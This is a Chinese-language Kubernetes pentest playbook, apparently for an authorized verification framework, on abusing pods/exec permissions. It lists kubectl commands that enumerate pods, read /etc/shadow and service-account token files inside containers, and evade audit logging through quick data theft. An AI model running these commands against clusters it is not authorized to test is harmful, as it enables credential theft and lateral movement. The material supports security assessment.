---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-2.5]
mapped_compliance_families: [RBAC配置, exec权限]
---

# k8s-exec-abuse — K8s exec 权限滥用

攻击者拥有 `pods/exec` 权限的 ServiceAccount 或用户，可进入任意 Pod 执行命令，窃取容器内敏感数据或横向移动。

---

## 1. 前置条件

- 当前 SA 或用户拥有 `pods/exec` 权限（可通过 RBAC 直接绑定或通过通配符/ClusterRole 获取）
- 目标 Pod 存在且可调度/运行中
- 拥有访问 API Server 的 kubeconfig 或 SA token

检查命令：
```bash
# [L0] 检查当前身份是否有 pods/exec 权限
kubectl auth can-i create pods/exec
# 期望输出: yes

# [L0] 列出集群中所有 Pod（确认目标存在）
kubectl get pods --all-namespaces
# 期望输出: 列出 Pod 清单
```

## 2. 探测命令

```bash
# [L0] 确认当前权限全集
kubectl auth can-i --list 2>/dev/null | grep -E 'exec|create'
# 期望输出: create pods/exec yes

# [L0] 枚举可 exec 的目标 Pod
kubectl get pods --all-namespaces -o wide
# 期望输出: 全集群 Pod 列表

# [L0] 检查目标 Pod 所在命名空间的 RBAC 约束
kubectl get rolebinding,clusterrolebinding -A -o json | jq '.items[] | select(.subjects[]?.name=="<sa-name>")'
# 期望输出: 当前 SA 的所有绑定
```

## 3. 攻击验证

```bash
# [L2] 进入任意目标 Pod 读取敏感文件
kubectl exec -n <target-ns> <target-pod> -- cat /etc/shadow
# 期望输出: root:$6$...:... (宿主机容器内 shadow 内容)

# [L2] 验证可进入任意 Pod 执行命令（确认非破坏性命令）
kubectl exec -n <target-ns> <target-pod> -- id
# 期望输出: uid=0(root) gid=0(root) groups=0(root)

# [L2] 读取容器内挂载的 Secret
kubectl exec -n <target-ns> <target-pod> -- ls -la /var/run/secrets/kubernetes.io/serviceaccount/
# 期望输出: token, namespace, ca.crt 文件列表
```

## 4. 差分证明

```bash
# [L0] 攻击前：记录目标 Pod 内文件清单
kubectl exec -n <target-ns> <target-pod> -- ls /tmp/
# 期望输出: 攻击前 /tmp 内容快照

# [L2] exec 后读取到的敏感文件内容
kubectl exec -n <target-ns> <target-pod> -- cat /etc/shadow
# 期望输出: shadow 内容 → 证明可访问任意 Pod 文件系统

# [L0] 攻击后：确认 Pod 状态未受影响
kubectl get pod -n <target-ns> <target-pod> -o jsonpath='{.status.phase}'
# 期望输出: Running（验证未破坏目标 Pod）
```

差分结论：攻击前无法从外部读取目标 Pod 内部文件，攻击后通过 `pods/exec` 成功读取容器内 `/etc/shadow` 及 SA token 文件，证明 `exec` 权限可被滥用进入任意容器。

## 5. 绕过策略

```bash
# [L1] 检查 audit policy 是否记录 exec 操作
grep -iE 'exec|pods/exec' /etc/kubernetes/audit-policy.yaml 2>/dev/null
# 若输出含 pods/exec 的 audit rule → 操作被审计记录

# [L1] 检查是否存在 AdmissionController 限制 exec 目标
kubectl get validatingwebhookconfiguration -o json | jq '.items[].webhooks[].rules[] | select(.resources[] | test("exec"))'
# 若输出含 exec 相关规则 → 可能被准入控制拦截

# 绕过方式：
# - [L1] 若 audit 记录但无实时拦截，利用 exec 进行快速数据窃取后撤出
# - [L2] 若特定命名空间被限制，枚举未限制的命名空间 Pod
# - [L2] 若 exec 被 ClientGo 强制要求 TTY，使用 -it 参数绕过无 TTY 检查
```

## 6. 证伪条件

```bash
# [L0] 无 pods/exec 权限
kubectl auth can-i create pods/exec
# 输出: no → 证伪

# [L0] 目标 Pod 不存在
kubectl get pod -n <target-ns> <target-pod> 2>&1
# 输出: NotFound → 证伪

# [L1] exec 被 RBAC 限制在特定命名空间
kubectl auth can-i create pods/exec -n <restricted-ns>
# 输出: no → 该命名空间证伪
```

## 7. 审批级别

- **L2** exec 攻击验证（进入任意 Pod 读取文件）→ **Level 3**（非破坏性 exec 验证，需人工确认）
- **L1** 探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Execution
- **Technique ID**: T1059
- **Technique Name**: Command and Scripting Interpreter
- **描述**: 攻击者利用 K8s `pods/exec` 权限进入任意 Pod 执行命令，可作为容器内初始执行、横向移动、敏感数据窃取的入口。